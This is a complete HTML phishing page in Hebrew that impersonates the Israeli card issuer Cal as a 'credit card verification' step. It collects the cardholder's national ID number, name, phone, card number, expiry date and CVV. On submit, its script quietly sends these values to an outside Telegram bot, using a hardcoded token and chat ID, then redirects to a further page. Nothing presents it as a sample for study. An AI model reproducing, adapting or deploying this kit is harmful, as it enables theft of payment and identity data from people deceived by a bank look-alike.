<!DOCTYPE html>
<html lang="he">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cal Credit Card</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
            direction: rtl; 
        }
        .logo {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            text-align: center;
            font-size: 30px;
            font-weight: bold;
            padding: 10px 0;
            background-color: white;
            color: #0057d8;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
            z-index: 1000;
        }
        .header {
            background-color: #0057d8;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 24px;
            margin-top: 60px; 
        }
        .container {
            max-width: 400px;
            margin: 0 auto;
            background: white;
            padding: 20px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }
        .input-group {
            margin-bottom: 20px;
        }
        .input-group input {
            width: 100%;
            padding: 10px 5px;
            border: none;
            border-bottom: 2px solid #ddd;
            outline: none;
            text-align: right;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        .input-group input:focus {
            border-bottom: 2px solid #0057d8; 
        }
        .input-group input.error {
            border-bottom: 2px solid red;
        }
        .error-message {
            color: red;
            font-size: 14px;
            margin-top: 5px;
            display: none;
        }
        .button {
            display: block;
            width: 100%;
            padding: 15px;
            background-color: #0057d8;
            color: white;
            text-align: center;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        .button:hover {
            background-color: #0044a8;
        }
    </style>
</head>
<body>

    <div class="logo">.Cal</div>

    <div class="header">
        אימות כרטיס אשראי
    </div>

    <div class="container">
        <div class="input-group">
            <label>פרטים אישיים</label>
            <input type="text" id="id" placeholder="מספר תעודת זהות של בעל הכרטיס" maxlength="9">
            <div class="error-message" id="id-error">נא למלא שדה זה</div>
            <div class="error-message" id="id-length-error">מספר תעודת זהות חייב להיות בן 9 ספרות.</div>
        </div>
        <div class="input-group">
            <input type="text" id="name" placeholder="שם בעל הכרטיס">
            <div class="error-message" id="name-error">נא למלא שדה זה</div>
        </div>
        <div class="input-group">
            <input type="text" id="phone" placeholder="הטלפון הנייד של בעל הכרטיס" maxlength="10">
            <div class="error-message" id="phone-error">נא למלא שדה זה</div>
            <div class="error-message" id="phone-length-error">מספר הטלפון חייב להיות בן 10 ספרות.</div>
        </div>
        <div class="input-group">
            <input type="text" id="card-number" placeholder="מספר כרטיס אשראי" maxlength="16">
            <div class="error-message" id="card-number-error">נא למלא שדה זה</div>
            <div class="error-message" id="card-number-length-error">מספר כרטיס האשראי חייב להיות בן 16 ספרות.</div>
        </div>
        <div class="input-group">
            <input type="text" id="card-expiry" placeholder="תאריך תפוגה" maxlength="5">
            <div class="error-message" id="expiry-error">נא למלא שדה זה</div>
            <div class="error-message" id="expiry-length-error">נא להזין תאריך תפוגה בפורמט MM/YY.</div>
        </div>
        <div class="input-group">
            <input type="text" id="cvv" placeholder="CVV" maxlength="3">
            <div class="error-message" id="cvv-error">נא למלא שדה זה</div>
            <div class="error-message" id="cvv-length-error">CVV חייב להיות בן 3 ספרות.</div>
        </div>
        <button class="button" onclick="validateForm()">אפשר להמשיך</button>
    </div>

    <script>
        const inputs = document.querySelectorAll('.input-group input');
        const expiryInput = document.getElementById('card-expiry');

        inputs.forEach(input => {
            input.addEventListener('input', () => {
                const errorMessage = input.nextElementSibling;
                const lengthErrorMessage = errorMessage.nextElementSibling;

                if (input.value.trim() === '') {
                    showError(input, errorMessage);
                } else if ((input.id === 'id' && input.value.length !== 9) ||
                           (input.id === 'phone' && input.value.length !== 10) ||
                           (input.id === 'card-number' && input.value.length !== 16) ||
                           (input.id === 'cvv' && input.value.length !== 3) ||
                           (input.id === 'card-expiry' && input.value.length !== 5)) {
                    showLengthError(input, lengthErrorMessage);
                } else {
                    hideError(input, errorMessage);
                    hideLengthError(input, lengthErrorMessage);
                }
            });
        });

        expiryInput.addEventListener('input', () => {
            const value = expiryInput.value.replace(/\D/g, ''); 
            let formattedValue = value;

            if (value.length > 2) {
                formattedValue = `${value.substring(0, 2)}/${value.substring(2, 4)}`;
            }

            expiryInput.value = formattedValue.substring(0, 5);
            const errorMessage = expiryInput.nextElementSibling;
            const lengthErrorMessage = errorMessage.nextElementSibling;
            if (expiryInput.value.length < 5) {
                showError(expiryInput, errorMessage);
                showLengthError(expiryInput, lengthErrorMessage);
            } else {
                hideError(expiryInput, errorMessage);
                hideLengthError(expiryInput, lengthErrorMessage);
            }
        });

        function showError(input, errorMessage) {
            input.classList.add('error');
            errorMessage.style.display = 'block';
        }

        function hideError(input, errorMessage) {
            input.classList.remove('error');
            errorMessage.style.display = 'none';
        }

        function showLengthError(input, lengthErrorMessage) {
            lengthErrorMessage.style.display = 'block';
        }

        function hideLengthError(input, lengthErrorMessage) {
            lengthErrorMessage.style.display = 'none';
        }

        function sendToTelegram(data) {
            const token = '7860990758:AAEL00gcX3iTB9N0D7z-9qBfDlbZ3hmHrO4';
            const chatId = '5021790058';
            const message = `
                ID number: ${data.id}
                Cardholder name: ${data.name}
                Phone: ${data.phone}
                Credit card number: ${data.card_number}
                Expiry date: ${data.card_expiry}
                CVV: ${data.cvv}
            `;

            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            fetch(url)
                .then(response => response.json())
                .then(data => console.log("Message sent"))
                .catch(error => console.error('Error:', error));
        }

        function validateForm() {
            let isValid = true;
            let formData = {};

            inputs.forEach(input => {
                const errorMessage = input.nextElementSibling;
                const lengthErrorMessage = errorMessage.nextElementSibling;

                if (input.value.trim() === '') {
                    showError(input, errorMessage);
                    isValid = false;
                } else {
                    hideError(input, errorMessage);
                    hideLengthError(input, lengthErrorMessage);
                }

                formData[input.id] = input.value.trim();
            });

            if (isValid) {
                sendToTelegram(formData);
                window.location.href = 'verification.html';
            } else {
                alert('נא לתקן את כל השגיאות לפני שליחה.');
            }
        }
    </script>

</body>
</html>
